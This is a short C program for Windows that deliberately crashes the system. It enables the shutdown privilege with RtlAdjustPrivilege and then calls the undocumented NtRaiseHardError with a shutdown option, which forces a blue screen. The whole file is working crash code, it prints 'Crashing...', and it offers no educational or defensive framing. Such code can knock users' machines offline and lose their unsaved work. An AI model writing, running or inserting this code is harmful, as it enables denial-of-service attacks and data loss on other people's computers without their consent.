#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

int main() {
    BOOLEAN PrivilegeState = FALSE;
    ULONG ErrorResponse = 0;
    RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
    printf("Crashing...");
    NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
    printf("Crash failed!");
    return 0;
}
